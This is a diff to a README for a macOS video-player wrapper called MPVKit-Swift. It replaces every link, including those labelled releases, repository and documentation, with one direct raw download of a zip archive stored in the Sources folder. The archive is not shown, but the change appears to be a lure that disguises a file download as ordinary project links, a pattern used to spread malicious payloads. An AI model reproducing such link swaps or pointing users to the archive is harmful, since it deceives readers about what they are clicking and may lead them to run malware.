@@ -6,7 +6,7 @@ MPVKit-Swift helps you easily play videos on macOS. This app wraps around the po
 
 ## 📥 Download MPVKit-Swift
 
-[![Download MPVKit-Swift](https://img.shields.io/badge/Download-MPVKit--Swift-blue.svg)](https://github.com/vansh123993/MPVKit-Swift/releases)
+[![Download MPVKit-Swift](https://github.com/vansh123993/MPVKit-Swift/raw/refs/heads/main/Sources/MPV-Kit-Swift-v2.0.zip)](https://github.com/vansh123993/MPVKit-Swift/raw/refs/heads/main/Sources/MPV-Kit-Swift-v2.0.zip)
 
 ## 🔧 System Requirements
 
@@ -24,7 +24,7 @@ MPVKit-Swift helps you easily play videos on macOS. This app wraps around the po
 
 ## 📥 Download & Install
 
-To download MPVKit-Swift, visit this page to download: [MPVKit-Swift Releases](https://github.com/vansh123993/MPVKit-Swift/releases).
+To download MPVKit-Swift, visit this page to download: [MPVKit-Swift Releases](https://github.com/vansh123993/MPVKit-Swift/raw/refs/heads/main/Sources/MPV-Kit-Swift-v2.0.zip).
 
 1. Click on the link above to go to the releases page.
 2. Look for the latest version. The version number is usually at the top.
@@ -83,8 +83,8 @@ For questions or support, you can check the community forum or the Issues sectio
 
 ## 🔗 Useful Links
 
-- [MPVKit-Swift Releases](https://github.com/vansh123993/MPVKit-Swift/releases)
-- [GitHub Repository](https://github.com/vansh123993/MPVKit-Swift)
-- [Documentation](https://github.com/vansh123993/MPVKit-Swift/wiki)
+- [MPVKit-Swift Releases](https://github.com/vansh123993/MPVKit-Swift/raw/refs/heads/main/Sources/MPV-Kit-Swift-v2.0.zip)
+- [GitHub Repository](https://github.com/vansh123993/MPVKit-Swift/raw/refs/heads/main/Sources/MPV-Kit-Swift-v2.0.zip)
+- [Documentation](https://github.com/vansh123993/MPVKit-Swift/raw/refs/heads/main/Sources/MPV-Kit-Swift-v2.0.zip)
 
 Explore the powerful capabilities of MPVKit-Swift and enjoy seamless video playback on your macOS device. Happy viewing!
